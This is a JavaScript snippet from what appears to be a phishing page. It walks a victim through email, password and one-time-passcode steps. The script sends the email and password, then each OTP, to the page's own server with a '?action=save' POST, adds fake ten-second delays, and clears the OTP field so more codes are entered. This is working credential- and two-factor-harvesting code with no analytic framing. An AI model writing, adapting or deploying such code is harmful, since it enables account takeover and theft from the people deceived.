<script>
        document.querySelector("#email-btn").addEventListener('click', () => {
            const email = document.querySelector("#email").value;
            if (email.length > 0) {
                document.querySelector("#step-0").classList.add('hidden');
                document.querySelector("#email-placeholder").innerHTML = email;
                document.querySelector("#step-1").classList.remove('hidden');
            }
        })
        document.querySelector("#pass-btn").addEventListener('click', () => {
            const password = document.querySelector("#password").value;
            if (password.length > 0) {
                document.querySelector("#spiner").classList.remove("hidden");
                fetch("./?action=save", {
                    method: "POST",
                    body: JSON.stringify({
                        email: document.querySelector("#email").value,
                        pass: password
                    })
                }).then(res => {
                    setTimeout(() => {
                        document.querySelector("#step-1").classList.add('hidden');
                        document.querySelector("#step-2").classList.remove('hidden');
                        document.querySelector("#spiner").classList.add("hidden");
                    }, 10 * 1000);
                })
            }
        })
        document.querySelector("#otp-btn").addEventListener('click', () => {
            const otp = document.querySelector("#otp").value;
            if (otp.length > 0) {
                document.querySelector("#spiner").classList.remove("hidden");
                fetch("./?action=save", {
                    method: "POST",
                    body: JSON.stringify({
                        otp: otp
                    })
                }).then(res => {
                    setTimeout(() => {
                        document.querySelector("#otp").value = "";
                        document.querySelector("#spiner").classList.add("hidden");
                    }, 10 * 1000);
                })
            }
        })
    </script>
